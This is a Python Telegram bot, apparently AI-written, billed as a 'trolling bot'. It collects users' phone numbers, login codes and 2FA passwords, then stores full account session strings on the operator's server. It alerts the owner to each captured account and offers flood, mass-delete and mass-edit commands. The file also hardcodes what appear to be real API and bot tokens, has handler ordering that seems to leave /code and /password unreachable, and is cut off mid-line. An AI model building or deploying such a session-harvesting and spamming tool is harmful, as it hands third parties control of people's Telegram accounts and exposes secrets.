# main.py
# Мульти-юзер авторизация (shared API_ID/API_HASH) + userbots
# Вшиты ключи по просьбе пользователя.
# Требует: aiogram, telethon, aiosqlite

import asyncio
import logging
import time
import random
import traceback
from collections import defaultdict, deque

from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import aiosqlite

# ----------------- ВАШИ КЛЮЧИ (уже вставлены) -----------------
API_ID = 22603193
API_HASH = "52012f357acfda33579dd701d7b4a131"
BOT_TOKEN = "8218314042:AAGflLWbojVmMfi31v2UC9XQ0aZwC31U4sQ"
OWNER_ID = 8486672898
DB_PATH = "sessions.db"
# ----------------------------------------------------------------

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
logger = logging.getLogger("multiuser")

# aiogram bot (авторизационный)
auth_bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(auth_bot)

# временное хранилище процесса авторизации: user_id -> dict
auth_tmp = {}

# running telethon clients: user_id -> (client, task)
user_clients = {}

# settings cache: user_id -> dict
user_settings_cache = {}

# ----------------- Protection / limits -----------------
# token-bucket per user (commands per X seconds)
CMD_TOKENS = 5              # tokens refilled_per_window per window
CMD_WINDOW = 5.0            # seconds
# per-chat / per-user deques for timestamps
user_timestamps = defaultdict(deque)   # user_id -> deque of timestamps
chat_timestamps = defaultdict(deque)   # chat_id -> deque

# heavy tasks semaphore (limit concurrent floods/bytes)
MAX_CONCURRENT_HEAVY_TASKS = 2
heavy_tasks_semaphore = asyncio.Semaphore(MAX_CONCURRENT_HEAVY_TASKS)

# caps for safety
MAX_FLOOD_MESSAGES = 10
MIN_FLOOD_DELAY = 0.5

# helper: rate limit check
def is_rate_limited_user(user_id: int):
    now = time.time()
    dq = user_timestamps[user_id]
    # drop older than window
    while dq and dq[0] <= now - CMD_WINDOW:
        dq.popleft()
    if len(dq) >= CMD_TOKENS:
        return True
    dq.append(now)
    return False

def is_rate_limited_chat(chat_id: int):
    now = time.time()
    dq = chat_timestamps[chat_id]
    while dq and dq[0] <= now - CMD_WINDOW:
        dq.popleft()
    if len(dq) >= CMD_TOKENS * 3:
        return True
    dq.append(now)
    return False

# ----------------- DB helpers -----------------
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""CREATE TABLE IF NOT EXISTS sessions (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            session_str TEXT,
            created_at REAL
        )""")
        await db.execute("""CREATE TABLE IF NOT EXISTS settings (
            user_id INTEGER PRIMARY KEY,
            uds INTEGER,
            udt INTEGER,
            autosms TEXT
        )""")
        await db.commit()

async def save_session_db(user_id: int, phone: str, session_str: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR REPLACE INTO sessions(user_id,phone,session_str,created_at) VALUES(?,?,?,?)",
                         (user_id, phone, session_str, time.time()))
        await db.commit()

async def remove_session_db(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM sessions WHERE user_id=?", (user_id,))
        await db.execute("DELETE FROM settings WHERE user_id=?", (user_id,))
        await db.commit()
    user_settings_cache.pop(user_id, None)

async def load_all_sessions():
    rows = []
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id,phone,session_str FROM sessions") as cur:
            async for row in cur:
                rows.append(row)
    return rows

async def load_session(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT phone,session_str FROM sessions WHERE user_id=?", (user_id,)) as cur:
            row = await cur.fetchone()
            return row if row else None

async def save_settings_db(user_id:int, uds, udt, autosms):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR REPLACE INTO settings(user_id,uds,udt,autosms) VALUES(?,?,?,?)",
                         (user_id, uds if uds is not None else None, udt if udt is not None else None, autosms))
        await db.commit()
    user_settings_cache[user_id] = {'uds': uds, 'udt': udt, 'autosms': autosms}

async def load_settings_db(user_id:int):
    if user_id in user_settings_cache:
        return user_settings_cache[user_id]
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT uds,udt,autosms FROM settings WHERE user_id=?", (user_id,)) as cur:
            row = await cur.fetchone()
            if row:
                settings = {'uds': row[0], 'udt': row[1], 'autosms': row[2]}
            else:
                settings = {'uds': None, 'udt': None, 'autosms': None}
    user_settings_cache[user_id] = settings
    return settings

# ----------------- Telethon userbot startup -----------------
async def start_user_client(user_id: int, session_str: str):
    if user_id in user_clients:
        return True
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return False

        async def get_settings():
            return await load_settings_db(user_id)

        @client.on(events.NewMessage)
        async def handler(event):
            # ignore outgoing messages by this account
            if event.out:
                return
            text = event.raw_text or ""
            chat_id = event.chat_id

            # quick rate checks (per-user & per-chat)
            if is_rate_limited_user(user_id) or is_rate_limited_chat(chat_id):
                # ignore processing commands under rate-limit to protect from DDoS
                return

            # auto-reply if set
            settings = await get_settings()
            autosms = settings.get("autosms") if settings else None
            if autosms and text and not text.startswith('.'):
                try:
                    await event.reply(autosms)
                except Exception:
                    pass

            # commands only if starting with '.'
            if not text.startswith('.'):
                return

            cmd_full = text.strip().split(maxsplit=1)
            cmd = cmd_full[0].lower()
            arg = cmd_full[1] if len(cmd_full) > 1 else ""

            # simple ping
            if cmd in ('.пинг', '.ping'):
                try:
                    await event.reply("Понг! Скорость ок.")
                except: pass

            # delete last N own messages: .дд N
            elif cmd in ('.дд', '.dd'):
                if not arg:
                    n = 1
                else:
                    try:
                        n = max(1, int(arg.split()[0]))
                    except:
                        await event.reply("Использование: .дд N")
                        return
                deleted = 0
                async for m in client.iter_messages(chat_id, from_user='me', limit=200):
                    if deleted >= n:
                        break
                    try:
                        await m.delete()
                        deleted += 1
                    except:
                        pass
                try:
                    await event.delete()
                except:
                    pass

            # edit last N own messages: .ред N text
            elif cmd in ('.ред', '.red'):
                try:
                    parts = text.split(maxsplit=2)
                    n = int(parts[1]); new_text = parts[2]
                except:
                    await event.reply("Использование: .ред N новый_текст")
                    return
                edited = 0
                async for m in client.iter_messages(chat_id, from_user='me', limit=200):
                    if edited >= n:
                        break
                    try:
                        await m.edit(new_text)
                        edited += 1
                    except:
                        pass
                await event.reply(f"✏️ Отредактировано {edited} сообщений")

            # safe flood: .флуд N delay text
            elif cmd == '.флуд':
                # enforce rate-limit per-user for heavy tasks
                if is_rate_limited_user(user_id):
                    try: await event.reply("Слишком часто запускают тяжёлые команды — попробуйте позже.")
                    except: pass
                    return

                try:
                    parts = text.split(maxsplit=3)
                    cnt = int(parts[1]); delay = float(parts[2]); msg = parts[3]
                except:
                    await event.reply("Использование: .флуд N задержка текст (N<=10, delay>=0.5s)")
                    return
                if cnt > MAX_FLOOD_MESSAGES:
                    cnt = MAX_FLOOD_MESSAGES
                if delay < MIN_FLOOD_DELAY:
                    delay = MIN_FLOOD_DELAY

                # acquire semaphore to limit concurrent heavy tasks
                acquired = await heavy_tasks_semaphore.acquire()
                if not acquired:
                    await event.reply("Сейчас сервер занят. Попробуйте позже.")
                    return
                await event.reply(f"Запускаю безопасный флуд: {cnt}×, задержка {delay}s")
                try:
                    for i in range(cnt):
                        try:
                            await client.send_message(chat_id, msg)
                        except Exception as e:
                            logger.warning("Flood send error: %s", e)
                            await asyncio.sleep(1)
                        await asyncio.sleep(delay)
                    await event.reply("✅ Флуд завершён.")
                finally:
                    heavy_tasks_semaphore.release()

            # anime image: .аниме [tag]
            elif cmd.startswith('.аниме'):
                imgs = {
                    'neko': ['https://i.imgur.com/6Yq3K0u.png'],
                    'waifu': ['https://i.imgur.com/E3R7sGq.png'],
                    'default': ['https://i.imgur.com/6Yq3K0u.png','https://i.imgur.com/E3R7sGq.png']
                }
                tag = arg.lower().strip() if arg else 'default'
                pool = imgs.get(tag, imgs['default'])
                try:
                    await client.send_file(chat_id, random.choice(pool))
                except:
                    pass

            # .тук удс N — set auto-delete seconds for messages sent by userbot in this account
            elif cmd == '.тук' and arg.startswith('удс'):
                try:
                    parts = text.split()
                    # format: .тук удс 10
                    val = int(parts[2])
                    settings = await load_settings_db(user_id)
                    await save_settings_db(user_id, val, settings.get('udt') if settings else None, settings.get('autosms') if settings else None)
                    await event.reply(f"Задержка авто-удаления установлена: {val}s")
                except Exception:
                    await event.reply("Использование: .тук удс <секунды>")

            # .тук удт N or .тук удт -
            elif cmd == '.тук' and arg.startswith('удт'):
                try:
                    parts = text.split()
                    if parts[2] == '-':
                        settings = await load_settings_db(user_id)
                        await save_settings_db(user_id, settings.get('uds') if settings else None, None, settings.get('autosms') if settings else None)
                        await event.reply("Сброшена задержка удаления текста выполненных команд")
                    else:
                        val = int(parts[2])
                        settings = await load_settings_db(user_id)
                        await save_settings_db(user_id, settings.get('uds') if settings else None, val, settings.get('autosms') if settings else None)
                        await event.reply(f"Задержка удаления текста команд установлена: {val}s")
                except Exception:
                    await event.reply("Использование: .тук удт <секунды> или .тук удт -")

            # fallback: unknown command
            else:
                # keep minimal replies to avoid spam
                try:
                    await event.reply("Команда не распознана или временно недоступна.")
                except:
                    pass

        # run client in background
        task = asyncio.create_task(client.run_until_disconnected())
        user_clients[user_id] = (client, task)
        logger.info(f"Started user client for {user_id}")
        return True
    except Exception as e:
        logger.exception("start_user_client error: %s", e)
        return False

async def stop_user_client(user_id: int):
    info = user_clients.get(user_id)
    if not info:
        return
    client, task = info
    try:
        await client.log_out()
    except:
        pass
    try:
        await client.disconnect()
    except:
        pass
    if not task.cancelled():
        task.cancel()
    user_clients.pop(user_id, None)
    await remove_session_db(user_id)
    logger.info(f"Stopped user client for {user_id}")

# ----------------- Aiogram handlers (auth) -----------------
@dp.message_handler(commands=["start"])
async def cmd_start(message: types.Message):
    await message.reply("Ты попал в троллинг бота 😈\n\nИспользуй /connect чтобы подключить свой аккаунт.")

@dp.message_handler(commands=["connect"])
async def cmd_connect(message: types.Message):
    uid = message.from_user.id
    auth_tmp[uid] = {"stage":"phone"}
    await message.reply("Введите номер телефона в формате +71234567890")

@dp.message_handler(commands=["status"])
async def cmd_status(message: types.Message):
    row = await load_session(message.from_user.id)
    if row:
        await message.reply(f"✅ У вас подключён юзербот для номера {row[0]}")
    else:
        await message.reply("❌ У вас нет подключённой сессии. Используйте /connect")

@dp.message_handler(commands=["logout"])
async def cmd_logout(message: types.Message):
    uid = message.from_user.id
    await stop_user_client(uid)
    await message.reply("✅ Ваша сессия отключена и удалена.")

@dp.message_handler(commands=["users"])
async def cmd_users(message: types.Message):
    if message.from_user.id != OWNER_ID:
        await message.reply("Доступно только владельцу.")
        return
    rows = await load_all_sessions()
    if not rows:
        await message.reply("Нет подключённых пользователей.")
        return
    txt = "Подключённые пользователи:\n" + "\n".join([f"{r[0]} — {r[1]}" for r in rows])
    await message.reply(txt)

@dp.message_handler()
async def catch_all(message: types.Message):
    uid = message.from_user.id
    # if we expect phone
    if uid in auth_tmp and auth_tmp[uid].get("stage") == "phone":
        phone = message.text.strip()
        if not phone.startswith('+') or len(phone) < 7:
            await message.reply("Неверный формат номера. Пример: +71234567890")
            return
        # send code via temp Telethon client
        try:
            temp = TelegramClient(StringSession(), API_ID, API_HASH)
            await temp.connect()
            await temp.send_code_request(phone)
            await temp.disconnect()
            auth_tmp[uid] = {"stage":"code_sent", "phone": phone}
            await message.reply("Код отправлен. Введите /code <код> (или /password <пароль> если включена 2FA).")
        except Exception as e:
            logger.exception("send_code error")
            await message.reply("Не удалось отправить код. Проверьте номер и попробуйте позже.")
        return

    # fallback guidance
    if message.text and message.text.startswith('/'):
        await message.reply("Используйте /connect чтобы подключить аккаунт, /status /logout /users (владелец).")
    else:
        await message.reply("Напишите /connect чтобы подключить аккаунт.")

@dp.message_handler(commands=["code"])
async def cmd_code(message: types.Message):
    uid = message.from_user.id
    parts = message.text.split()
    if len(parts) < 2:
        await message.reply("Использование: /code <код>")
        return
    code = parts[1].strip()
    tmp = auth_tmp.get(uid)
    if not tmp or tmp.get("stage") != "code_sent":
        await message.reply("Сначала отправьте номер через /connect")
        return
    phone = tmp["phone"]
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            await client.sign_in(phone=phone, code=code)
        except Exception as e:
            if 'PASSWORD' in str(e).upper() or 'SESSION_PASSWORD_NEEDED' in str(e).upper():
                auth_tmp[uid]['stage'] = 'password_needed'
                auth_tmp[uid]['client_temp'] = client.session.save()
                await message.reply("Требуется 2FA. Введите /password <ваш пароль>")
                return
            else:
                logger.exception("sign_in issue")
                await message.reply("Не удалось войти — неверный код или другая ошибка.")
                await client.disconnect()
                return
        session_str = client.session.save()
        await save_session_db(uid, phone, session_str)
        started = await start_user_client(uid, session_str)
        if started:
            await message.reply("✅ Аккаунт подключён и userbot запущен.")
            try:
                await auth_bot.send_message(OWNER_ID, f"Новый подключённый аккаунт: {phone} (user {uid})")
            except:
                pass
        else:
            await message.reply("⚠️ Не удалось запустить userbot (попробуйте позже).")
        await client.disconnect()
        auth_tmp.pop(uid, None)
    except Exception as e:
        logger.exception("cmd_code error")
        await message.reply("Ошибка при авторизации. Попробуйте ещё раз.")

@dp.message_handler(commands=["password"])
async def cmd_password(message: types.Message):
    uid = message.from_user.id
    tmp = auth_tmp.get(uid)
    if not tmp or tmp.get("stage") != "password_needed":
        await message.reply("Нет запроса пароля. Сначала /connect и /code.")
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.reply("Использование: /password <ваш пароль>")
        return
    pwd = parts[1].strip()
    saved = tmp.get("client_temp")
    try:
        client = TelegramClient(StringSession(saved), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(password=pwd)
        session_str = client.session.save()
        phone = tmp['phone']
        await save_session_db(uid, phone, session_str)
        started = await start_user_client(uid, session_str)
        if started:
            await message.reply("✅ Юзербот подключён (2FA).")
            try:
                await auth_bot.send_message(OWNER_ID, f"Новый подключённый аккаунт (2FA): {phone} (user {uid})")
            except: pass
        else:
            await message.reply("⚠️ Не удалось запустить юзербот.")
        await client.disconnect()
        auth_tmp.pop(uid, None)
    except Exception as e:
        logger.exception("password sign_in error")
        await message.reply("Ошибка при вводе пароля 2FA. Проверьте пароль и попробуйте снова.")

# ----------------- startup & main loop with auto-restart -----------------
async def start_existing_sessions():
    rows = await load_all_sessions()
    for user_id, phone, session_str in rows:
        try:
            await start_user_client(user_id, session_str)
        except Exception:
            logger.excepti
